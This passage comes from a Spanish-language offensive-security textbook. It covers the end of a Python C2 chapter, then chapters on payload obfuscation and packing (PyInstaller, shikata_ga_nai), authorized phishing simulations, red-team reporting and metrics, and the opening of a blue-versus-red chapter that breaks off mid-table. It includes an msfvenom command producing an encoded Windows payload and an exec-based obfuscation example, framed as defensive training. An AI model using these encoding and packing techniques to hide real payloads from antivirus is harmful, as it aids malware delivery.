Para que el sistema sea útil desde una perspectiva **Blue Team**, se deben registrar todos los eventos:

```python
def log_event(event):
    with open("c2_activity.log", "a") as f:
        f.write(f"[{datetime.datetime.now()}] {event}\n")
```

Esto permite enseñar cómo los analistas pueden:

* Correlacionar eventos.
* Identificar sesiones activas.
* Rastrear comportamiento del cliente.

---

## 8. Seguridad y detección

| Riesgo en C2 reales               | Defensa recomendada                    |
| --------------------------------- | -------------------------------------- |
| Conexiones persistentes ocultas   | IDS/IPS y alertas por tráfico inusual. |
| Ofuscación de PowerShell o Python | Monitoreo de procesos y hashes.        |
| Canales cifrados no estándar      | Análisis de certificados y DNS.        |
| Persistencia del agente           | Restricción de privilegios locales.    |
| Comunicación C2 via HTTP          | Proxy con inspección de cabeceras.     |

Los Blue Teams deben identificar patrones comunes, incluso cuando el contenido está cifrado.

---

## 9. Ejercicio práctico

1. Ejecutar `c2_server.py` y `c2_client.py` en máquinas virtuales separadas.
2. Analizar el tráfico con Wireshark: identificar los comandos enviados.
3. Modificar el código para registrar IP, comandos y respuestas.
4. Implementar cifrado AES y observar cómo cambia el tráfico.
5. Configurar un IDS (Zeek, Suricata) para generar alertas sobre conexiones recurrentes.

---

## 10. Checklist de desarrollo ético de C2

* [ ] Usar solo en laboratorios privados.
* [ ] No ejecutar comandos del sistema real.
* [ ] No usar cifrado para ocultar malware.
* [ ] Documentar toda la comunicación.
* [ ] Implementar auditoría completa.
* [ ] Enseñar detección y defensa, no explotación.
* [ ] Aislar las máquinas de la red pública.
* [ ] Destruir entornos tras la práctica.

---

## 11. Conclusión

Diseñar un C2 básico en Python es una lección invaluable sobre **cómo piensan los atacantes** y **cómo pueden responder los defensores**.
La clave no es construir malware, sino comprender los **principios técnicos del control remoto**, la comunicación cifrada y la gestión de sesiones.

Con una arquitectura modular y transparente, este proyecto se convierte en un **entorno educativo seguro**, donde cada comando sirve para ilustrar conceptos de ingeniería inversa, detección y respuesta ante amenazas.

El conocimiento del C2 no es peligroso cuando se usa con ética, sino una herramienta para construir **infraestructuras más seguras y resilientes**.

---

# Capítulo 50 — Ofuscación y empaquetado de payloads

**PyInstaller, Shikata_ga_nai y empaquetado multiplataforma — Aplicación ética y educativa**

---

## Objetivos

* Comprender los principios de la **ofuscación de código y empaquetado ejecutable**.
* Aprender cómo los atacantes intentan evadir detección mediante técnicas de encriptación y empaquetado.
* Utilizar herramientas legítimas como **PyInstaller** para compilar software educativo y simular flujos de malware controlados.
* Analizar cómo funcionan codificadores clásicos como **shikata_ga_nai**, sin uso ofensivo, desde una perspectiva de ingeniería inversa.
* Diseñar un proceso de empaquetado **seguro y multiplataforma**, para distribuciones legales (Linux, Windows, macOS).

> **Aviso ético:** este capítulo **no enseña a crear ni distribuir malware**.
> Su objetivo es comprender las técnicas utilizadas por atacantes para **entrenar defensas**, detectar binarios ofuscados y desarrollar código legítimo más resistente a ingeniería inversa.

---

## 1. Introducción: por qué entender la ofuscación

Los mecanismos de **detección de amenazas** (antivirus, EDR, SIEM) se basan en firmas, patrones binarios y comportamiento.
Los atacantes, para evadir estos controles, emplean **ofuscadores y empacadores** que transforman el código sin alterar su funcionalidad.

Conocer cómo funcionan es esencial para:

* Desarrollar mejores mecanismos de detección.
* Auditar software sospechoso.
* Fortalecer el empaquetado legítimo de herramientas corporativas.

En un laboratorio, la ofuscación se usa solo para **investigación de detección**, no para ocultar intenciones ilícitas.

---

## 2. PyInstaller — empaquetado legítimo de Python

**PyInstaller** convierte un script `.py` en un ejecutable autónomo.
Empaqueta el intérprete y las dependencias, permitiendo su ejecución en sistemas sin Python instalado.

### Instalación

```bash
pip install pyinstaller
```

### Ejemplo básico

```bash
pyinstaller --onefile monitor_sistema.py
```

Esto genera un binario (`dist/monitor_sistema`) listo para distribuir, útil en contextos corporativos o de investigación.

### Opciones comunes

| Opción        | Descripción                                      |
| ------------- | ------------------------------------------------ |
| `--onefile`   | Crea un solo ejecutable.                         |
| `--noconsole` | Oculta la consola en Windows.                    |
| `--add-data`  | Incluye recursos adicionales (config, imágenes). |
| `--icon`      | Añade un ícono personalizado.                    |
| `--key`       | Encripta el bytecode (limitado).                 |

**Ejemplo con cifrado ligero:**

```bash
pyinstaller --onefile --key "seguridad2025" app.py
```

El parámetro `--key` aplica una capa básica de cifrado XOR sobre los `.pyc` internos.
No es infalible, pero simula un flujo de protección del código legítimo.

---

## 3. Empaquetado multiplataforma

Aunque PyInstaller puede generar binarios para Linux, macOS y Windows, **debe hacerse desde el sistema destino o en contenedores específicos**, ya que los ejecutables no son portables entre plataformas.

| Plataforma  | Comando                        | Resultado                      |
| ----------- | ------------------------------ | ------------------------------ |
| **Windows** | `pyinstaller --onefile app.py` | `.exe` con intérprete embebido |
| **Linux**   | `pyinstaller --onefile app.py` | binario ELF                    |
| **macOS**   | `pyinstaller --onefile app.py` | binario Mach-O                 |

### Ejemplo práctico: pipeline de build

```bash
#!/bin/bash
# empaquetar.sh — Compila versiones multiplataforma (laboratorio)
for OS in linux windows mac; do
    echo "[*] Empaquetando para $OS..."
    pyinstaller --onefile --name "educativo_${OS}" app.py
done
echo "[+] Proceso finalizado. Revisar /dist/"
```

**Objetivo:** simular el flujo de creación de ejecutables legítimos en entornos multi-OS.

---

## 4. Ofuscación de código en Python (educativa)

La ofuscación busca hacer difícil la lectura del código fuente, sin modificar su función.
Ejemplo conceptual:

### Antes

```python
def saludar(nombre):
    print(f"Hola, {nombre}!")
```

### Después (ofuscado)

```python
exec(''.join([chr(x) for x in [100,101,102,32,115,97,108,117,100,97,114,40,110,41,58,10,32,32,32,32,112,114,105,110,116,40,102,34,72,111,108,97,44,32,123,110,125,33,34,41,10]]))
```

Ambos hacen lo mismo, pero el segundo es ilegible.
En el ámbito ético, se usa para:

* Proteger propiedad intelectual.
* Simular detección de ofuscadores.
* Estudiar heurísticas de antivirus.

---

## 5. Shikata_ga_nai — análisis académico

El codificador **shikata_ga_nai** (“no se puede evitar”) es un clásico algoritmo polimórfico de **Metasploit** que cifra payloads en múltiples capas XOR y altera su forma con cada ejecución.
Aunque es ampliamente conocido en contextos ofensivos, su estudio académico sirve para:

* Comprender cómo los antivirus detectan patrones metamórficos.
* Entrenar modelos de Machine Learning en detección binaria.
* Desarrollar **heurísticas anti-ofuscación**.

### Ejemplo educativo (sin explotación)

```bash
msfvenom -p windows/exec CMD=calc.exe -e x86/shikata_ga_nai -f raw > output.bin
xxd output.bin | head
```

**Propósito:** generar un payload *simulado* y analizar su estructura hexadecimal para estudiar cómo cambia en cada codificación.
**Nunca** ejecutar el binario ni distribuirlo fuera de un laboratorio sin conexión.

---

## 6. Flujo de detección y respuesta ante ofuscación

| Etapa                        | Técnica ofensiva               | Defensa recomendada                |
| ---------------------------- | ------------------------------ | ---------------------------------- |
| **Codificación XOR**         | Enmascara cadenas.             | Detección por entropía alta.       |
| **Empaquetado PyInstaller**  | Oculta código fuente.          | Análisis de strings y imports.     |
| **Ejecutables polimórficos** | Cambian en cada build.         | Hash dinámico y sandbox.           |
| **Inyección dinámica**       | Carga código en memoria.       | Control de integridad del proceso. |
| **Encriptado base64/rot13**  | Codifica secciones del script. | Decodificación estática previa.    |

---

## 7. Ejemplo: pipeline educativo de detección

### Script Bash

```bash
#!/bin/bash
# detectar_ofuscacion.sh — Mide entropía y patrones sospechosos
FILE=$1
if [ -z "$FILE" ]; then
    echo "Uso: $0 archivo"
    exit 1
fi

ENTROPY=$(ent $FILE | grep Entropy | awk '{print $3}')
echo "[*] Entropía detectada: $ENTROPY"
if (( $(echo "$ENTROPY > 7.5" | bc -l) )); then
    echo "[!] Posible binario ofuscado o cifrado."
else
    echo "[+] Archivo con entropía normal."
fi
```

Este script utiliza la herramienta `ent` para calcular la entropía del archivo y detectar posibles signos de cifrado o compresión.
Es una **técnica real de Blue Team** aplicada en pipelines de análisis forense.

---

## 8. Ejemplo: empaquetado seguro con PyInstaller y logs

```python
#!/usr/bin/env python3
"""
monitor_sistema.py — Ejemplo de aplicación empaquetada segura.
"""
import psutil, datetime

def registrar():
    with open("registro.log", "a") as f:
        f.write(f"{datetime.datetime.now()} | CPU: {psutil.cpu_percent()}% | RAM: {psutil.virtual_memory().percent}%\n")

if __name__ == "__main__":
    registrar()
    print("Monitoreo registrado correctamente.")
```

Luego:

```bash
pyinstaller --onefile monitor_sistema.py
```

El ejecutable resultante **no oculta intenciones**, sino que muestra cómo se empaqueta software legítimo sin activar falsos positivos.

---

## 9. Buenas prácticas para empaquetado legítimo

| Práctica                                      | Beneficio                       |
| --------------------------------------------- | ------------------------------- |
| Firmar digitalmente el ejecutable.            | Garantiza integridad.           |
| Incluir documentación y hashes públicos.      | Transparencia.                  |
| No usar empaquetadores con técnicas evasivas. | Reduce falsos positivos.        |
| Mantener código fuente disponible.            | Auditoría confiable.            |
| Aislar entornos de build.                     | Minimiza contaminación cruzada. |

---

## 10. Ejercicio de laboratorio

1. Crea un script Python simple (ej. `monitor_sistema.py`).
2. Empaquétalo con PyInstaller (`--onefile`).
3. Calcula la entropía del binario con `ent`.
4. Compara con un binario codificado con `base64` o XOR.
5. Registra diferencias en entropía y tamaño.
6. Descompila con `pyinstxtractor.py` para ver cómo se estructura el paquete.
7. Analiza qué se puede detectar con un antivirus o EDR.

---

## 11. Checklist ético de ofuscación

* [ ] Solo usar ofuscación en fines de defensa o preservación de propiedad intelectual.
* [ ] Nunca distribuir binarios codificados fuera del laboratorio.
* [ ] Mantener auditorías y firmas digitales.
* [ ] Evitar combinaciones con técnicas de inyección o persistencia.
* [ ] Respetar la licencia de las herramientas utilizadas (PyInstaller, msfvenom).
* [ ] Documentar el propósito del empaquetado.
* [ ] Usar entornos aislados y desconectados para las pruebas.

---

## 12. Conclusión

El estudio de la ofuscación y empaquetado es esencial para comprender **cómo se oculta el código, no para hacerlo invisible**.
Un Red Teamer ético necesita dominar estas técnicas para **enseñar al Blue Team a detectarlas**, no para abusar de ellas.

Empaquetadores como **PyInstaller** demuestran la delgada línea entre la seguridad legítima y el abuso ofensivo.
Analizar algoritmos como **shikata_ga_nai** desde un punto de vista técnico y académico permite mejorar la detección, la respuesta y la ciberresiliencia.

La meta es clara: conocer la oscuridad para fortalecer la luz.
El conocimiento no es peligroso cuando se usa para proteger.

---

# Capítulo 51 — Ingeniería social técnica y phishing

**Plantillas, infraestructura autorizada y tracking ético (enfoque defensivo)**

---

## Objetivos

* Explicar la anatomía del phishing y la ingeniería social técnica para **defenderse**.
* Describir cómo diseñar ejercicios de phishing *autorizados* y seguros para evaluación de seguridad y formación.
* Proveer plantillas educativas y ejemplos anotados (marcados como simulación).
* Establecer métricas, procesos de legalidad/consentimiento y un runbook de respuesta y remediación.
* Señalar herramientas y prácticas recomendadas para auditoría y seguimiento **sin** facilitar abuso.

> **Aviso ético:** todo lo descrito aquí está orientado a **entornos controlados**, con autorización por escrito, coordinación con RR. HH. y cumplimiento legal. No se incluyen scripts o instrucciones para generar campañas reales ni para recolectar credenciales.

---

## 1. Breve anatomía del phishing y la ingeniería social técnica

* **Elementos típicos de un ataque:** gancho (subject/preview), credibilidad (marca / identidad), urgencia/acción esperada, artefacto de entrega (email/SMS/voice), y página o mecanismo de captura.
* **Vías comunes:** correo electrónico (phishing), SMS (smishing), llamadas (vishing), mensajería (WhatsApp/Telegram), y redes sociales.
* **Objetivos:** obtener credenciales, inducir a instalar software, ejecutar transferencias o filtrar información sensible.
* **Factores que aumentan éxito:** conocimiento del objetivo (spear-phishing), ingeniería de confianza (compañeros/manager), y fallas comunicacionales (falta de procesos de verificación).

---

## 2. Fundamentos legales y éticos para simulaciones

Antes de cualquier ejercicio de phishing autorizado, documentar y obtener:

1. **Alcance por escrito** (quiénes están dentro/fuera del alcance, qué vectores se probarán).
2. **Autorización ejecutiva y de RR. HH.** (firmas).
3. **Acuerdo legal y políticas internas** que cubran privacidad, almacenamiento y eliminación de datos recolectados.
4. **Plan de comunicaciones** post-simulación (cómo informar a los empleados y qué material de formación se entregará).
5. **Plan de mitigación inmediata** si la campaña produce impacto operacional inesperado.
6. **Retención mínima de datos sensibles** (ej.: borrar credenciales simuladas de inmediato).

Nunca ejecutar simulaciones sin estos pasos: el riesgo legal y reputacional es real.

---

## 3. Diseño de un ejercicio de phishing autorizado (pasos)

1. **Definir objetivos pedagógicos** (p. ej. medir tasa de reporte vs tasa de clics, concienciar sobre spear-phishing).
2. **Seleccionar la audiencia** (segmentación por departamento, nivel de riesgo).
3. **Establecer métricas e hipótesis** (baseline, KPI targets).
4. **Diseñar plantillas y landing pages educativas** (landing *segura* que no recopile credenciales; en su lugar, explica la simulación).
5. **Probar internamente (dry-run)** con un pequeño grupo control.
6. **Ejecutar durante ventana acordada** y con monitoreo activo (SOC y RR. HH.).
7. **Responder inmediatamente** a incidentes (si hay confusión, problemas técnicos o ansiedad entre empleados).
8. **Debrief y formación** masiva: lo aprendido, porqué fue peligroso, cómo reportar.
9. **Borrar y anonimizar** todos los datos sensibles recogidos según la política.
10. **Repetir y medir evolución** (campañas periódicas y mejora continua).

---

## 4. Plantillas educativas (marcadas y seguras)

Las siguientes plantillas **son para formación/autorizadas**. Deben incluir siempre un identificador visible que indique que son ejercicios de formación —para evitar engaño real— salvo en ejercicios muy controlados donde la organización haya acordado simulación oculta de forma explícita por escrito.

### 4.1 Notificación previa (para campañas transparentes)

Asunto: Simulación de seguridad autorizada — ejercicio de concienciación
Cuerpo (ejemplo):

> **[SIMULACIÓN AUTORIZADA] — Ejercicio de concienciación sobre phishing**
> Estimado equipo,
> En el marco de nuestro programa de seguridad, realizaremos hoy una campaña de concienciación sobre phishing. Si recibes un mensaje con carácter sospechoso, por favor repórtalo a [security@empresa.local](mailto:security@empresa.local). No es necesario realizar ninguna otra acción.
> Gracias por colaborar.
> Seguridad TI

### 4.2 Plantilla de prueba (marcada como simulación)

Asunto: [SIMULACIÓN] Actualización requerida en cuenta interna
Cuerpo (ejemplo):

> **[SIMULACIÓN — ENTRENAMIENTO]**
> Hola {Nombre},
> Por motivos de mantenimiento, solicitamos que **verifiques tu acceso** al portal interno antes de las 17:00. Pulsa “Revisar mi cuenta” para confirmar que todo está correcto.
> **IMPORTANTE:** este es un ejercicio de concienciación. Al pulsar, verás una página formativa con consejos para identificar phishing.
> Si tienes dudas, contacta a [security@empresa.local](mailto:security@empresa.local).
> Equipo de Seguridad

> (Landing page segura debe explicar por qué fue sospechoso y enseñar señales que revelarían un phishing real.)

### 4.3 Email de seguimiento / formación tras la simulación

Asunto: Resultados de la simulación de phishing — acciones y formación
Cuerpo (ejemplo):

> Estimado/a {Nombre},
> Realizamos una simulación autorizada. Observamos que X% del personal hizo clic en la prueba y Y% lo reportó correctamente.
> Para ayudarte a mejorar, adjuntamos una guía rápida y un micro-curso de 15 minutos. Si hiciste clic en el enlace, **no** cambies contraseñas hasta que estés instruido por RR. HH./Seguridad.
> Recursos: [Guía rápida], [Micro-curso], [Cómo reportar un correo sospechoso].
> Gracias por colaborar.

---

## 5. Diseño seguro de la landing page de formación

* **No recopilar contraseñas** ni datos sensibles.
* Mostrar inmediatamente un mensaje: “Esta fue una simulación autorizada” (si la campaña no es oculta) o, en ejercicio controlado y permitido, una página que explique signos de phishing y ofrezca la formación.
* Incluir botón “Reportar dudas” que abra un ticket interno al SOC o RR. HH.
* Registrar métricas mínimas (clic, tiempo en página, si completó el micro-curso) y anonimizar datos si no son necesarios para seguimiento individual.

---

## 6. Métricas y KPIs recomendados (ética y seguridad)

* **Tasa de entrega (delivery rate):** porcentaje de correos entregados.
* **Tasa de apertura (open rate):** porcentaje que abrió el correo.
* **Tasa de clic (click-through rate, CTR):** porcentaje que hizo clic en el enlace.
* **Tasa de envío de credenciales (en simulaciones autorizadas que lo permitan —recomendado: evitar):** idealmente 0 —si se usa, solo en entornos controlados con consentimiento explícito y *nunca* almacenarlas.
* **Tasa de reporte (report rate):** porcentaje que reportó el correo al canal oficial.
* **Tiempo medio hasta el reporte (MTTR-user):** rapidez con la que los empleados reportan.
* **Acciones correctivas completadas:** porcentaje que completó formación posterior.
* **Reducción intercampaña:** evolución de CTR y report rate entre campañas.

Importante: priorizar métricas que mejoren comportamientos (report rate y tiempo para reportar) frente a métricas punitivas.

---

## 7. Runbook de respuesta post-simulación (para SOC / RR. HH.)

1. **Aviso inmediato a stakeholders** (si la campaña fue oculta previamente, notificar a RR. HH. y a dirección).
2. **Validación técnica:** confirmar que no hubo impacto operacional ni filtración de datos reales.
3. **Comunicación a empleados:** enviar el debrief (ver plantilla).
4. **Formación dirigida:** asignar micro-cursos a quienes clicaron y reforzar a quienes reportaron.
5. **Revisión de procesos:** escaparates de verificación (p. ej. cómo validar pedidos de pagos o transferencias por Slack/Teams).
6. **Documentación y anonimización:** almacenar métricas agregadas; anonimizar o borrar datos sensibles inmediatamente.
7. **Plan de mejora:** calendarizar próximas campañas y objetivos educativos.

---

## 8. Diseño del programa organizacional (phishing program governance)

* **Owner del programa:** equipo de seguridad con participación de RR. HH.
* **Comité de revisión:** legal, RR. HH., seguridad y comunicaciones.
* **Cadena de autorización:** documento firmado que define alcance y límites.
* **Comunicación interna:** plantillas para filtros y explicación pre/post ejercicio.
* **Política de datos:** retención y eliminación obligatoria de cualquier dato sensible obtenido.
* **KPIs y reporting ejecutivo:** tablero trimestral con evolución y roadmap de formación.

---

## 9. Recomendaciones de herramientas y servicios (uso responsable)

* Para simulaciones profesionales y controladas, usar **proveedores acreditados** o plataformas de concienciación que incluyen funciones de legalidad y privacidad (ej.: servicios comerciales de awareness).
* Evitar construir soluciones caseras que recojan credenciales: riesgo legal y de fuga de datos.
* Integrar con SIEM/SOAR para correlacionar reportes y validar detecciones.
* Coordinar con RR. HH. para planes de apoyo y no dañar la confianza interna.

> Nota: no listaré ni proporcionaré código o scripts que automaticen campañas de phishing o el tracking encubierto de credenciales.

---

## 10. Señales de detección y telemetría que monitorear (SOC)

* Picos inusuales en URLs internas desde cuentas de usuarios.
* Peticiones a dominios recién creados desde la red corporativa.
* Actividad de correo rechazado / rebotado inusual.
* Aumento de tickets de soporte relacionados con contraseñas en horas tras campaña.
* Cuentas que intentan restablecer contraseñas tras recibir un correo (posible exposición).
* Reportes de usuarios a canales oficiales (positivo) vs. reportes por canales no oficiales (indica confusión).

---

## 11. Formación y materiales post-campaña

* Micro-módulos de 10–20 minutos: reconocer phishing, verificar remitentes, reportar.
* Checklist imprimible: 5 señales rápidas para identificar un correo sospechoso.
* Talleres prácticos: role-play para verificar solicitudes de pago por teléfono/email.
* Vídeos cortos con ejemplos anotados (por qué un correo es falso).

---

## 12. Ejemplo de checklist corto para empleados (para imprimir)

* ¿El remitente coincide exactamente con la organización? (dominio, no sólo nombre)
* ¿Solicitan urgencia o miedo? Ten cuidado.
* ¿Piden acciones inusuales (transferencias, abrir adjuntos, instalar algo)? Verifica.
* ¿El enlace muestra un dominio extraño? No hagas clic: pasa el cursor para ver URL.
* **Siempre** reporta a [security@empresa.local](mailto:security@empresa.local) o via botón “Report Phish”.

---

## 13. Conclusión

La ingeniería social y el phishing existen porque se aprovechan de la confianza humana. El enfoque responsable es **medir, formar y empoderar** a las personas para detectar y reportar ataques, no para sorprenderlas sin respaldo.
Un programa ético de simulación combina: autorización legal, diseño pedagógico, landing pages seguras que *no* recolecten credenciales, métricas orientadas al aprendizaje, y remediación humana (RR. HH. + formación).

---

# Capítulo 52 — Red Team Metrics y Reporting

**Cómo presentar hallazgos, evidencias y recomendaciones (con generadores automatizados en Python)**

---

## Objetivos

* Comprender cómo estructurar los reportes de Red Team con métricas medibles y trazabilidad técnica.
* Diseñar plantillas profesionales de informes ejecutivos y técnicos.
* Aprender a generar reportes automatizados en Python, basados en resultados, evidencias y logs.
* Presentar recomendaciones prácticas que faciliten la mitigación y la toma de decisiones.
* Definir KPIs (indicadores clave de desempeño) y KRIs (indicadores de riesgo) orientados a la mejora continua.

> **Aviso ético:** los reportes del Red Team deben reflejar únicamente actividades **autorizadas**, realizadas bajo contrato o política interna.
> Los datos, métricas y evidencias contenidas en estos reportes **no deben compartirse fuera de la organización sin autorización expresa**.

---

## 1. Importancia del reporting en operaciones Red Team

El valor de un Red Team no está solo en encontrar vulnerabilidades, sino en **comunicar eficazmente los hallazgos** a los decisores.
Un informe bien diseñado traduce resultados técnicos en impacto de negocio, prioriza riesgos y guía las acciones del Blue Team.

**Un buen reporte debe:**

* Ser **claro** para dirección y técnico para seguridad.
* Basarse en **evidencias verificables** (hashes, logs, capturas).
* Incluir **KPIs cuantificables** y **acciones mitigadoras concretas**.
* Mantener un tono profesional y objetivo (sin culpas).
* Respetar la confidencialidad de los sistemas y usuarios.

---

## 2. Estructura profesional del informe final

| Sección                | Descripción                                                           | Audiencia                  |
| ---------------------- | --------------------------------------------------------------------- | -------------------------- |
| **Resumen ejecutivo**  | Impacto global, principales vulnerabilidades, probabilidad e impacto. | Dirección / CISO           |
| **Metodología**        | Fases del ejercicio (recon, exploit, persistencia, reporte).          | Técnicos / Auditoría       |
| **Hallazgos críticos** | Vulnerabilidades o accesos obtenidos.                                 | Blue Team / CISO           |
| **Evidencias**         | Capturas, logs, hashes.                                               | Seguridad técnica          |
| **Métricas y KPIs**    | Resultados cuantitativos del ejercicio.                               | Gestión / Auditoría        |
| **Recomendaciones**    | Soluciones y mitigaciones priorizadas.                                | Gestión / Operaciones      |
| **Anexos**             | Scripts, hashes, cronología, firmas.                                  | Técnicos / Control interno |

---

## 3. Definición de métricas Red Team

Las métricas deben reflejar tanto la **efectividad del ataque simulado** como la **madurez defensiva**.

### Métricas ofensivas

| Métrica                             | Descripción                                   | Ejemplo                       |
| ----------------------------------- | --------------------------------------------- | ----------------------------- |
| **TTPs ejecutadas**                 | Técnicas utilizadas (MITRE ATT&CK).           | 32 TTPs simuladas.            |
| **Tasa de éxito de explotación**    | Porcentaje de intentos exitosos.              | 60% en servicios vulnerables. |
| **Tiempo hasta la detección (TTD)** | Tiempo entre acción y alerta.                 | 22 min promedio.              |
| **Persistencia lograda**            | Cuántos sistemas mantuvieron acceso simulado. | 4 de 10 endpoints.            |
| **Evasión de controles**            | Porcentaje de defensas superadas.             | 70% antivirus, 40% EDR.       |

### Métricas defensivas

| Métrica                                   | Descripción                          | Ejemplo        |
| ----------------------------------------- | ------------------------------------ | -------------- |
| **MTTD (Mean Time to Detect)**            | Tiempo promedio de detección.        | 45 min.        |
| **MTTR (Mean Time to Respond)**           | Tiempo hasta respuesta o mitigación. | 3 horas.       |
| **Tasa de falsos positivos**              | Alarmas sin correlato real.          | 12% del total. |
| **Cobertura de visibilidad (telemetría)** | Porcentaje de eventos monitoreados.  | 85%.           |

---

## 4. Registro estructurado de hallazgos

Un formato estándar facilita análisis y automatización:

```json
{
  "id": "RT-2025-001",
  "fase": "Explotación",
  "descripcion": "Vulnerabilidad RDP sin MFA permitió acceso remoto.",
  "criticidad": "Alta",
  "impacto": "Control remoto del servidor de pruebas.",
  "evidencia": "hash:sha256:14f2b0c...",
  "fecha": "2025-11-08T18:22Z",
  "estado": "Mitigado",
  "recomendacion": "Habilitar MFA y limitar accesos RDP externos."
}
```

Este formato JSON puede procesarse con scripts automatizados para generar reportes en PDF o HTML.

---

## 5. Automatización de reporting con Python

A continuación, un **script educativo** para generar un informe técnico en formato Markdown o PDF a partir de registros JSON de hallazgos.

```python
#!/usr/bin/env python3
"""
report_generator.py — Generador automatizado de informes Red Team.
Uso ético: convertir hallazgos autorizados en reportes profesionales.
"""
import json, datetime
from fpdf import FPDF

def generar_reporte(input_json, output_pdf):
    with open(input_json, 'r') as f:
        data = json.load(f)
    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", "B", 14)
    pdf.cell(200, 10, "Informe Red Team - Ejercicio Controlado", ln=True, align='C')
    pdf.set_font("Arial", size=12)
    pdf.cell(200, 10, f"Fecha: {datetime.datetime.now()}", ln=True)
    pdf.ln(10)
    for hallazgo in data:
        pdf.multi_cell(0, 8, f"ID: {hallazgo['id']}\n"
                             f"Fase: {hallazgo['fase']}\n"
                             f"Descripción: {hallazgo['descripcion']}\n"
                             f"Criticidad: {hallazgo['criticidad']}\n"
                             f"Impacto: {hallazgo['impacto']}\n"
                             f"Recomendación: {hallazgo['recomendacion']}\n"
                             f"Estado: {hallazgo['estado']}\n"
                             f"---\n")
    pdf.output(output_pdf)
    print(f"[+] Reporte generado: {output_pdf}")

if __name__ == "__main__":
    generar_reporte("hallazgos.json", "reporte_redteam.pdf")
```

**Qué hace:**

* Lee un archivo `hallazgos.json` con vulnerabilidades o eventos simulados.
* Genera automáticamente un informe en PDF.
* Puede integrarse en pipelines CI/CD o SOC.

---

## 6. Ejemplo de entrada JSON (hallazgos)

```json
[
  {
    "id": "RT-2025-001",
    "fase": "Reconocimiento",
    "descripcion": "Puerto SSH expuesto sin restricción de IP.",
    "criticidad": "Media",
    "impacto": "Posible enumeración de servicios y banner grabbing.",
    "evidencia": "screenshot_ssh_banner.png",
    "estado": "Pendiente",
    "recomendacion": "Restringir IPs permitidas y deshabilitar login root."
  },
  {
    "id": "RT-2025-002",
    "fase": "Explotación",
    "descripcion": "Aplicación web vulnerable a inyección SQL.",
    "criticidad": "Alta",
    "impacto": "Acceso no autorizado a base de datos de prueba.",
    "evidencia": "log_sql_injection.txt",
    "estado": "Mitigado",
    "recomendacion": "Validar entradas y usar consultas preparadas."
  }
]
```

El script produce un PDF con el resumen estructurado de hallazgos.

---

## 7. Plantilla para resumen ejecutivo

| Categoría                              | Resultado                 |
| -------------------------------------- | ------------------------- |
| **Total de hallazgos**                 | 14                        |
| **Críticos**                           | 3                         |
| **Altos**                              | 5                         |
| **Medios**                             | 4                         |
| **Bajos**                              | 2                         |
| **Tiempo total de ejercicio**          | 10 días                   |
| **MTTD promedio**                      | 30 minutos                |
| **MTTR promedio**                      | 2 horas                   |
| **Sistemas comprometidos (simulados)** | 2/50 (4%)                 |
| **Eficacia del Blue Team**             | 84% detecciones correctas |

> **Conclusión ejecutiva:** la organización mantiene una buena visibilidad técnica, pero requiere reforzar MFA en acceso remoto y revisión de políticas de filtrado HTTP.

---

## 8. Automatización con métricas y dashboards

El siguiente fragmento muestra cómo generar estadísticas visuales a partir del JSON:

```python
#!/usr/bin/env python3
"""
metrics_dashboard.py — Crea métricas visuales del ejercicio Red Team.
"""
import json, matplotlib.pyplot as plt
from collections import Counter

data = json.load(open("hallazgos.json"))
criticidades = [x["criticidad"] for x in data]
conteo = Counter(criticidades)

plt.bar(conteo.keys(), conteo.values())
plt.title("Distribución de hallazgos por criticidad")
plt.xlabel("Nivel de severidad")
plt.ylabel("Cantidad de hallazgos")
plt.savefig("metrics.png")
print("[+] Gráfico generado: metrics.png")
```

El gráfico resultante puede integrarse al PDF generado por `report_generator.py`.

---

## 9. Buenas prácticas de documentación y presentación

* **Mantener hashes y firmas** de todos los archivos entregados (SHA256).
* **Separar informe técnico y ejecutivo** para distintas audiencias.
* **Evitar capturas sensibles** (ocultar credenciales, IPs, usuarios).
* **Usar lenguaje neutral:** nunca “rompimos” o “hackeamos”, sino “se simuló un acceso controlado”.
* **Incluir responsable de cada hallazgo** y fecha de mitigación.
* **Presentar un resumen visual** (dashboard, líneas de tiempo, gráficos).
* **Cifrar el informe** (GPG o ZIP AES) antes de enviarlo.

---

## 10. Checklist de cierre de ejercicio Red Team

* [ ] Todos los hallazgos validados y documentados.
* [ ] Se firmaron hashes y logs.
* [ ] Reporte técnico revisado por QA interno.
* [ ] Reporte ejecutivo adaptado al nivel directivo.
* [ ] Archivos cifrados y compartidos mediante canal seguro.
* [ ] Cronograma de mitigación validado con Blue Team.
* [ ] Informe archivado en repositorio seguro.
* [ ] Métricas publicadas en dashboard interno.

---

## 11. Conclusión

La automatización de reporting no solo ahorra tiempo: **eleva la transparencia y reproducibilidad** del trabajo del Red Team.
Con plantillas estandarizadas, scripts de generación automática y métricas claras, el equipo puede mostrar resultados medibles que justifiquen decisiones estratégicas.

Un reporte bien estructurado transforma el ejercicio de Red Team en una **herramienta de aprendizaje organizacional**: evidencia el riesgo, mejora la defensa y fomenta la colaboración técnica.

> La evidencia sin contexto es ruido.
> El contexto sin métrica es opinión.
> El Red Teaming efectivo entrega ambos: **datos y comprensión**.

---

## Parte IX — Detección, evaluación y remediación desde la perspectiva offensive

# Capítulo 53 — Estrategias de Blue Team vs Red Team

**Detección típica, evasión ética y pruebas automatizadas controladas**

---

## Objetivos

* Entender las **estrategias operativas** del Blue Team y cómo el Red Team debe adaptarse para evadirlas **de forma ética y controlada**.
* Analizar los principales **vectores de detección** usados por defensores: EDR, SIEM, IDS/IPS, honeypots y correlación de eventos.
* Diseñar **tests automatizados** de detección en entornos de laboratorio (sin afectar sistemas reales).
* Definir un marco de cooperación entre Red y Blue Team orientado al aprendizaje y mejora continua.
* Presentar ejemplos de simulaciones seguras que validen la capacidad de respuesta defensiva.

> **Aviso ético:** este capítulo describe prácticas de evasión únicamente dentro de **entornos de laboratorio autorizados**, sin afectar infraestructura productiva.
> El propósito es **mejorar las capacidades defensivas** al comprender cómo se comporta un atacante, no enseñar técnicas ofensivas de intrusión.

---

## 1. Introducción: dos fuerzas complementarias

El Red Team y el Blue Team no son enemigos: son **dos caras del mismo sistema inmunológico**.
Mientras el Red Team simula a un adversario para exponer debilidades, el Blue Team detecta, contiene y responde.
Ambos comparten el mismo objetivo: **elevar la resiliencia de la organización**.

El Red Team mide la eficacia del Blue Team, y el Blue Team mide la capacidad del Red Team para permanecer oculto.
El resultado ideal es un **ciclo de mejora continua** donde la defensa aprende más rápido que el ataque.

---

## 2. Mapa general de detección defensiva

| Herramienta / Sistema               | Qué detecta                       | Nivel      | Ejemplo de alerta                            |
| ----------------------------------- | --------------------------------- | ---------- | -------------------------------------------- |
